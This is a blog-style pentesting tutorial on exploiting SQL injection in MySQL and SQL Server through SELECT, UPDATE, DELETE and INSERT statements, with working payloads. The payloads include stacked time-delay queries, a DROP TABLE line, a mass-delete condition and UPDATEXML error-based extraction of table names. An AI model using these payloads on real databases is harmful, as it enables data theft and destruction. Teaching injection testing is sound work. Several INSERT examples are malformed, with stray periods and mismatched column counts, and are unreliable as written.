SQL Injection in MySQL and SQL Server
============

This article will discuss some techniques to exploit SQL Injection in MySQL and SQL Server. For a better understanding what happened behind the back-end, I think we should demonstrate on the console. By this way, we can entirely understand the whole query and where's the injection point as well as this method will be more simple and straightforward.

In this section, we will discuss about exploiting SQL not by its type, but by its keywords. Here I choose 4 main keywords: SELECT, INSERT, UPDATE and DELETE. Without further ado, let's dive into it.

I created a simple database with 2 tables. Here's the SQL script
```sql
-- Create Category Table
Drop TABLE IF EXISTS Category;
CREATE TABLE Category (
    category_id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(255) NOT NULL
);

-- Create Product Table
Drop TABLE IF EXISTS Product;
CREATE TABLE Product (
    product_id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(255) NOT NULL,
    description TEXT,
    price DECIMAL(10, 2) NOT NULL,
    stock_quantity INT NOT NULL,
    category_id INT,
    FOREIGN KEY (category_id) REFERENCES Category(category_id)
);

-- Insert example values into Category Table
INSERT INTO Category (name) VALUES
('Men'),
('Women');

-- Insert example values into Product Table
INSERT INTO Product (name, description, price, stock_quantity, category_id) VALUES
('Men\'s T-shirt', 'Cotton T-shirt with a round neck', 20.00, 50, 1),
('Men\'s Jeans', 'Blue denim jeans with a slim fit', 40.00, 30, 1),
('Men\'s Sunglasses', 'Polarized sunglasses with UV protection', 15.00, 20, 1),
('Men\'s Sneakers', 'Comfortable running sneakers', 60.00, 25, 1),
('Men\'s Jacket', 'Water-resistant windbreaker jacket', 80.00, 10, 1),
('Men\'s Hoodie', 'Fleece hoodie with adjustable drawstring', 35.00, 20, 1),
('Men\'s Watch', 'Stainless steel wristwatch with leather strap', 150.00, 10, 1),
('Men\'s Sandals', 'Casual sandals with adjustable straps', 30.00, 22, 1),
('Women\'s T-shirt', 'Cotton T-shirt with a round neck', 20.00, 50, 2),
('Women\'s Jeans', 'Blue denim jeans with a slim fit', 40.00, 30, 2),
('Women\'s Sunglasses', 'Polarized sunglasses with UV protection', 15.00, 20, 2),
('Women\'s Sneakers', 'Comfortable running sneakers', 60.00, 25, 2),
('Women\'s Jacket', 'Water-resistant windbreaker jacket', 80.00, 10, 2),
('Women\'s Hoodie', 'Fleece hoodie with adjustable drawstring', 35.00, 20, 2),
('Women\'s Watch', 'Stainless steel wristwatch with leather strap', 150.00, 10, 2),
('Women\'s Sandals', 'Casual sandals with adjustable straps', 30.00, 22, 2),
('Women\'s Summer Dress', 'Lightweight summer dress with floral print', 45.00, 15, 2),
('Women\'s Leather Bag', 'Genuine leather shoulder bag', 120.00, 5, 2);

```
SELECT STATEMENT
---
Let's start with the SELECT keywords. When we test for SQL Injection, i think it's important to guess how the SQL query looks like, this is also the reason why i demonstrate directly in the console. For MySQL i use MySQL Workbench and for SQL Server I use SQL Server Management Studio. Let imagine there's search function and it will match our input with the product name:
```sql
SELECT * FROM Product WHERE price between ? and ? LIMIT $limit
```
We can easily see that the `$limit` parameter is the vulnerable part. In this case, we can simply create a payload to test for SQL injection. Payload use `1; SELECT SLEEP(1) --`. The reason I use `SLEEP()` is because I also want to test for blind SQL Injection. We will rely on the response time from the server to see if it's vulnerable to SQL Injection. This is the full query after injection: 

```sql
SELECT * FROM Product WHERE price between 10 and 20 LIMIT 1; SELECT SLEEP(2); --
```
When we run this query in the console, it will return the result of the first query and then sleep for 2 seconds. For further exploitation, we can inject malicious payloads which can destroy the entire database such as: `1; DROP TABLE Product; --` to remove the Product table.

To make the game harder, let's change the injection point. As usual, it will be easier for us if the injection point occurs behind the *WHERE* clause. What would it be if the injection point is placed before the FROM keyword, like this query:
```sql
SELECT $table FROM Product WHERE price between ? and ? LIMIT ?
```

We can imagine this query is used to return the result of a specific column of a table. To cut the story short, what we need to do is create a valid query and then stop that query by adding `;` to start our payload. Normally, we will try `* FROM Product; SELECT SLEEP(3); -- `. However, in real-world scenario,  we don't know the table name, so the previous payload is not possible in this case. We need to find another to make that query valid. The answer is quite simple, we can use `SELECT SLEEP()` and our payload will become something like this:
```sql
SELECT SLEEP(2); SELECT * FROM information_schema.tables; -- FROM Product WHERE price between 10 and 20 LIMIT 2
```
This is just a payload for demonstration. In reality, we can do a lot more because we have full control to manipulate the query.

With SQL Server, there will be some differences, let's find out what they are. In SQL Server, it doesn't support `limit`, instead, it will use `SELECT TOP` to return the number of records we want. Therefore, the testing query will look like this 
```sql
SELECT TOP $limit FROM Product WHERE price between ? and ?
```
Note that we cannot supply an expression  to `$limit`, it only accept a number. However, it's not very hard to have a valid query in this case. In most databases, except OracleDB, there's a database called `information_schema` which provides metadata of other databases. With this feature, it's not very hard for us to have a valid query by using this payload:
```sql
SELECT TOP 1 * FROM information_schema.tables; waitfor delay '00:00:02'; -- WHERE price between 10 and 20
```
We keep the same technique to exploit SQL injection: Try to have a valid query first, terminate it and inject our payload.

UPDATE STATEMENT
-------------
Next, we will explore the UPDATE statement. In most scenario, we can only imagine that the value we update will be after the `SET`  keyword or `WHERE` clause. Let's take this 2 queries as examples:
```sql
UPDATE Product SET price= $user_input WHERE product_id=?
UPDATE Product SET price= ? WHERE product_id=$user_input

```
As discussed above, our approach is to first terminate the original query and then start a new query. Although 2 queries have different injection points, the method is identical. We can try `1; select sleep(10); --` for MySQL and `1; waitfor delay '00:00:02'` for SQL Server. In my opinion, time-based injection payload is ideal for testing as it can work with blind SQL injection. Even the query can be more complicated in practice, the method remains unchanged. That's why i just demonstrate a simple case. The important thing is that we need to understand how it is injected and will go further by guessing how the actual query looks like.

DELETE STATEMENT
----------------
`Delete` statement is a special case for us while testing. Not because it's difficult, but rather because it will have a catastrophic impact to the database if we don't do it properly. For example, I have this query:
```sql
DELETE FROM Product WHERE product_id=$user_input
```
As normal, if we try this payload `1 or 1=1; -- `, then all the records of `Product` table will be deleted. Because we provide an ***always true*** comparison after WHERE `clause`, which means that the query will become `DELETE FROM Product`. However, this is not what we want. Instead, we should choose a safer way to test in this case, and the method is just like we discussed, using **time-based** injection. We can use these payloads for MySQL and SQL Server respectively:
```sql
DELETE FROM Product WHERE product_id=1; SELECT SLEEP(2); -- 
```
```sql
DELETE FROM Product WHERE product_id=1; waitfor delay '00:00:02'
```
INSERT STATEMENT
----
Finally, `INSERT` statement will be the last we will discuss in this article, which i think is also the most difficult one. At first, we will explore MySQL. I have this query:
```sql
INSERT INTO Product(name, description, price, stock_quantity, category_id) VALUES 
("$user_input", ?, ?, ?, ?)
```
The problem with `INSERT` statement is that, we don't know exactly how many columns will be added, so we need to find a way to first identify if SQL injection occurs. `" or (SELECT SLEEP(2)) or '`, the whole query will look like this:
```sql
INSERT INTO Product(name, description, price, stock_quantity, category_id) VALUES 
("" or (SELECT SLEEP(2)) or "", RANDOM, RANDOM, RANDOM, RANDOM)
```
MySQL support expression for inserting a value. To explain, I try to compare an empty string with a subquery (which is also the payload to know if it's vulnerable to SQL injection) and other comparison to close the double quote `"` in order to make the query valid. No matter what values are inserted behind that, it will first sleep for 2  seconds, which is too enough to be a good indication for us. I read a blog from *Osanda Malith Jayathissa* on [this link](https://www.exploit-db.com/docs/33253). In this blog, he provided a method to extract data by take advantage of the `updatexml()` function, this function has its own features but it will return error about the metadata of database, which is valueable for us. I will explain more detailed later. To extract data, we will replace the subquery with a new one, `'' or
UPDATEXML(0, CONCAT(":", (SELECT table_name from information_schema.tables WHERE table_schema=database() limit 0,1)),0) or ''`
Full query:
```sql
INSERT INTO Product(name, description, price, stock_quantity, category_id) VALUES ('' or
UPDATEXML(0, CONCAT(":", (SELECT table_name from information_schema.tables WHERE table_schema=database() limit 0,1)),0) or '', '', '', '', ''); 
```
Once we run the query in the console, it will return: `Error Code: 1105. XPATH syntax error: ':category'
`, while means that there's a table name `category` in the database. With this technique, we can dive deeper to enumerate other tables as well as their columns. 

On the other hand, it's not possible to use this technique with SQL Server. Alternatively, there's another technique can  be used for both MySQL and SQL Server. This can be done by injecting *null* value to other columns. For example, `',null,null,null) --`, try until we successfully create an instance. that time we can terminate original query and inject our payload.  This is how the full query will look like:
```sql
INSERT INTO Product(name, description, price, stock_quantity, category_id) VALUES ('',null, null. null); waitfor delay '00:00:02'-- ,"description",'price', 1, 1)
```
Sometimes there are some fields require `not null` values. In those cases, we need to modify the value we inserted to make a valid query.+
```sql
INSERT INTO Product(name, description, price, stock_quantity, category_id) VALUES ('',1, null. 1); waitfor delay '00:00:02'-- ,"description",'price', 1, 1)
```
This technique requires trying multiple times until we successfully identify how many rows in that table. 

----------------

This is the end of this article, I've just presented some techniques which can help pentester test for SQL injection. One more time, I want to emphasize the importance of understanding the root cause of SQL injection as well as guessing the query. Happy hacking!!!
